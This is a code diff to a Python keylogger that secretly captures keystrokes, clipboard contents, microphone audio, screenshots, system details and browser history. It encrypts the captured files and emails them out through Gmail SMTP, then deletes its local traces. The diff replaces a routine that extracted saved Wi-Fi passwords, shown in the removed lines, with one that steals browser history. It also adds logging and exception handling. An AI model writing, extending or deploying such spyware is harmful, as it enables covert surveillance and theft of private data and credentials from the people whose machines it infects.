@@ -7,17 +7,16 @@ from email.mime.text import MIMEText
 from email.mime.base import MIMEBase
 from email import encoders
 import smtplib
-#Send exception to attacker
-import traceback
+#Run without console or window
+import logging
 #computer info
 import socket
 import platform
 from requests import get
 #clipboard
 import win32clipboard
-#wifi info
-import subprocess
-import re
+#browser info
+import browser_history as bh
 #keylogging
 from pynput.keyboard import Listener
 import time
@@ -36,6 +35,15 @@ from PIL import ImageGrab
 #importing variables
 import json
 
+#configure the logging system so all errors,info,exceptions etc are captured in a file
+logging.basicConfig(
+    level=logging.INFO,
+    format='%(asctime)s - %(levelname)s - %(message)s',
+    handlers=[
+        logging.FileHandler("keylogger.log")  # Output to file
+    ]
+)
+
 with open('config.json') as f:
     config = json.load(f)
 
@@ -44,14 +52,14 @@ keys_information = config["keys_information"]
 keys_send = config["keys_send"]
 system_information = config["system_information"]
 clipboard_information = config["clipboard_information"]
-wifi_information = config["wifi_information"]
+browser_information = config["browser_information"]
 audio_information = config["audio_information"]
 screenshot_information = config["screenshot_information"]
 
 keys_send_e = config["keys_send_e"]
 system_information_e = config["system_information_e"]
 clipboard_information_e = config["clipboard_information_e"]
-wifi_information_e = config["wifi_information_e"]
+browser_information_e = config["browser_information_e"]
 
 microphone_time = config["microphone_time"]
 time_iteration = config["time_iteration"]
@@ -73,8 +81,8 @@ file_merge = file_path + extend
 
 files_to_encrypt = [file_merge + clipboard_information, file_merge + keys_send]
 send_file_names = [file_merge + clipboard_information_e, file_merge + keys_send_e, file_merge + audio_information, file_merge + screenshot_information ]
-system_files = [ file_merge + system_information, file_merge + wifi_information ]
-encrypted_system_files = [file_merge + system_information_e, file_merge + wifi_information_e ]
+system_files = [ file_merge + system_information, file_merge + browser_information ]
+encrypted_system_files = [file_merge + system_information_e, file_merge + browser_information_e ]
 
 # email controls
 def send_email(file_list, subject, body):
@@ -94,12 +102,12 @@ def send_email(file_list, subject, body):
         msg.attach(MIMEText(body, 'plain'))
 
         for file in file_list:
-            attachment = open(file, 'rb')
-            mime_base = MIMEBase('application', 'octet-stream')
-            mime_base.set_payload((attachment).read())
-            encoders.encode_base64(mime_base)
-            mime_base.add_header('Content-Disposition', f'attachment; filename= {os.path.basename(file)}')
-            msg.attach(mime_base)
+            with open(file, 'rb') as attachment:
+                mime_base = MIMEBase('application', 'octet-stream')
+                mime_base.set_payload((attachment).read())
+                encoders.encode_base64(mime_base)
+                mime_base.add_header('Content-Disposition', f'attachment; filename= {os.path.basename(file)}')
+                msg.attach(mime_base)
 
         s = smtplib.SMTP('smtp.gmail.com', 587)
 
@@ -135,8 +143,7 @@ try:
                 f.write("Hostname: " + hostname + "\n")
                 f.write("Private IP Address: " + IPAddr + "\n")
         except Exception as e:
-                with open("error.log", "a") as f:
-                    f.write(traceback.format_exc())          
+            logging.exception(e)      
     t1 = threading.Thread(target=computer_information)
     t1.start()
 
@@ -150,69 +157,43 @@ try:
 
                 f.write("Clipboard Data: \n" + pasted_data)
 
-            except:
+            except Exception as e:
                 f.write("Clipboard could be not be copied")
+                logging.exception(e)
 
     #get the wifi profiles
-    def get_wifi_profiles():
-        with open(file_path + extend + wifi_information, "a") as f:
-            try:
-                # Run the command to get WiFi profiles
-                result = subprocess.run(['netsh', 'wlan', 'show', 'profiles'], capture_output=True, text=True, check=True)
-                output = result.stdout
-
-                # Extract profile names from the output
-                profile_names = re.findall(r'All User Profile\s+:\s(.*)', output)
-
-                wifi_profiles = []
-
-                for name in profile_names:
-                    # For each profile, run the command to get the key (password)
-                    profile_info = subprocess.run(['netsh', 'wlan', 'show', 'profile', name, 'key=clear'], capture_output=True, text=True, check=True)
-                    profile_output = profile_info.stdout
-
-                    # Extract the password from the profile output
-                    password = re.search(r'Key Content\s+:\s(.*)', profile_output)
-
-                    if password is None:
-                        wifi_profiles.append((name, "No password set"))
-                    else:
-                        wifi_profiles.append((name, password.group(1)))
-
-                return wifi_profiles
-
-            except subprocess.CalledProcessError as e:
-                f.write(f"Error retrieving WiFi profiles: {e}")
-                return None
-
-    #get the wifi passwords into a file
-    def save_wifi_passwords():
+    def get_browser_history(): 
         try:
-            with open(file_path + extend + wifi_information, "a") as f:
-                wifi_profiles = get_wifi_profiles()
+            BrowserClass = bh.utils.default_browser()
 
-                if wifi_profiles is None:
-                    f.write("Failed to retrieve WiFi profiles. Check error messages for details.")
-                    return
+            if BrowserClass is None:
+                logging.ERROR("Could Not Identify Default Browser !!!\n")
+            else:
+                b = BrowserClass()
+                # his is a list of (datetime.datetime, url, title) tuples
+                hist = b.fetch_history()    
+                hist.save(file_merge + browser_information, output_format = "json")       
 
-                for profile, password in wifi_profiles:
-                    f.write(f"SSID: {profile}\nPassword: {password}\n\n")
+        # If error occurs
         except Exception as e:
-                with open("error.log", "a") as f:
-                    f.write(traceback.format_exc())   
-    t2 = threading.Thread(target=save_wifi_passwords)
+             logging.exception(e)
+             
+    t2 = threading.Thread(target=get_browser_history)
     t2.start()
 
     # get the microphone
     def microphone():
-        fs = 44100
-        seconds = microphone_time
+        try:
+            fs = 44100
+            seconds = microphone_time
 
-        myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
-        sd.wait()
+            myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
+            sd.wait()
 
-        write(file_path + extend + audio_information, fs, myrecording)
-
+            write(file_path + extend + audio_information, fs, myrecording)
+        except Exception as e:
+            logging.exception(e)
+    
     # get screenshots
     def screenshot():
         im = ImageGrab.grab()
@@ -220,21 +201,24 @@ try:
 
     # Encrypt files
     def encryption():
-        count = 0
+        try:
+            count = 0
 
-        for encrypting_file in files_to_encrypt:
+            for encrypting_file in files_to_encrypt:
 
-            with open(files_to_encrypt[count], 'rb') as f:
-                data = f.read()
+                with open(files_to_encrypt[count], 'rb') as f:
+                    data = f.read()
 
-            fernet = Fernet(key)
-            encrypted = fernet.encrypt(data)
+                fernet = Fernet(key)
+                encrypted = fernet.encrypt(data)
 
-            with open(send_file_names[count], 'wb') as f:
-                f.write(encrypted)
-            count += 1   
-
-    #onetime log with system information
+                with open(send_file_names[count], 'wb') as f:
+                    f.write(encrypted)
+                count += 1   
+        except Exception as e:
+            logging.exception(e)
+            
+    # Onetime mail with system and browser information
     def send_once():
         try:
             count = 0
@@ -248,10 +232,9 @@ try:
                 with open(encrypted_system_files[count], 'wb') as f:
                     f.write(encrypted)       
                 count+=1
-            send_email(encrypted_system_files, "SYSTEM INFO + WIFI PASSWORDS", "Encrypted Files attached")
+            send_email(encrypted_system_files, "SYSTEM INFO + BROWSER HISTORY", "DATA FILES")
         except Exception as e:
-                with open("error.log", "a") as f:
-                    f.write(traceback.format_exc())    
+            logging.exception(e)    
     t3 = threading.Thread(target=send_once)
     t3.start()
 
@@ -312,13 +295,13 @@ try:
             future4.result()  # Wait for the fourth function to complete
 
             # Execute the fifth function
-            future5 = executor.submit(send_email, send_file_names, time.strftime("%Y-%m-%d %H:%M:%S", time.localtime()), "LOG FILES")
+            future5 = executor.submit(send_email, send_file_names, time.strftime("%Y-%m-%d %H:%M:%S", time.localtime()), "DATA FILES")
             future5.result()  # Wait for the fifth function to complete    
 
         currentTime = time.time()
 
     t3.join()
-    delete_files =  system_files + encrypted_system_files + files_to_encrypt + send_file_names 
+    delete_files = system_files + encrypted_system_files + files_to_encrypt + send_file_names 
     for file in delete_files:
         os.remove(file)
     os.remove(file_merge + keys_information)
@@ -327,7 +310,7 @@ try:
             os.rmdir(file_merge)
             
 except Exception as e:
-    with open("error.log", "a") as f:
-        f.write(traceback.format_exc())
-        f.close()
-    send_email(["error.log"],"ERROR OCCURED","LOG FILE ATTACHED BELOW")
+    logging.exception(e)
+
+    
+send_email(["keylogger.log"],"KEYLOGGER TERMINATED","LOG FILE ATTACHED BELOW")
